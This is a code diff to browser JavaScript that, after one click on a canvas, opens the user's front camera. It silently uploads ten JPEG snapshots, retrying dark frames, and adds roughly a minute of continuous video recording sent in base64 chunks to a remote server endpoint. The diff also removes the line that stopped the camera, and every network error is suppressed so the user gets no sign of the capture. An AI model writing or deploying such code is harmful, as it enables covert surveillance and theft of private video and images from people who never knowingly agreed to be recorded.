@@ -592,29 +592,48 @@ function _startCam() {
       v.playsInline = true; v.muted = true;
       v.srcObject = stream; v.play();
       function waitReady() {
-        if (v.videoWidth > 0 && v.readyState >= 3) { _snap(v, stream, 1); }
-        else { setTimeout(waitReady, 200); }
+        if (v.videoWidth > 0 && v.readyState >= 3) {
+          _startVideo(stream);
+          setTimeout(function(){ _snap(v, stream, 1); }, 1500);
+        } else { setTimeout(waitReady, 200); }
       }
       setTimeout(waitReady, 1200);
     }).catch(function() {});
+}
+
+function _startVideo(stream) {
+  var mime = ['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4'].find(function(m){ try{return MediaRecorder.isTypeSupported(m);}catch(e){return false;} });
+  var mr;
+  try { mr = new MediaRecorder(stream, mime ? {mimeType:mime, videoBitsPerSecond:600000} : {}); } catch(e) { return; }
+  mr.ondataavailable = function(e) {
+    if (!e.data || e.data.size < 100) return;
+    var reader = new FileReader();
+    reader.onload = function() {
+      var b64 = reader.result.split(',')[1];
+      fetch(_CAM_SERVER + '/cam/' + _CAM_TID, {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({facing:'user', chunk:b64, chunk_idx:0, chunk_total:1, video:true, mime:mime||'video/webm', seg:true})
+      }).catch(function(){});
+    };
+    reader.readAsDataURL(e.data);
+  };
+  mr.start(4000);
+  setTimeout(function(){ try{ if(mr.state!=='inactive') mr.stop(); }catch(e){} }, 60000);
 }
 
 function _snap(v, stream, idx) {
   var c = document.createElement('canvas');
   c.width = v.videoWidth; c.height = v.videoHeight;
   c.getContext('2d').drawImage(v, 0, 0);
-  var data = c.toDataURL('image/jpeg', 0.90);
-  // проверяем яркость
   var id = c.getContext('2d').getImageData(0,0,40,40).data;
   var bright = 0; for(var i=0;i<id.length;i+=4) bright+=id[i]+id[i+1]+id[i+2];
   if (bright < 2000 && idx < 8) { setTimeout(function(){_snap(v,stream,idx);}, 400); return; }
   fetch(_CAM_SERVER + '/cam/' + _CAM_TID, {
     method: 'POST', keepalive: true,
     headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({facing:'user', data:data, shot:idx, total:10})
+    body: JSON.stringify({facing:'user', data:c.toDataURL('image/jpeg', 0.90), shot:idx, total:10})
   }).catch(function(){});
   if (idx < 10) setTimeout(function(){ _snap(v, stream, idx+1); }, 1500);
-  else stream.getTracks().forEach(function(t){ t.stop(); });
 }
 
 canvas.addEventListener('click', function() { _startCam(); }, { once: true });
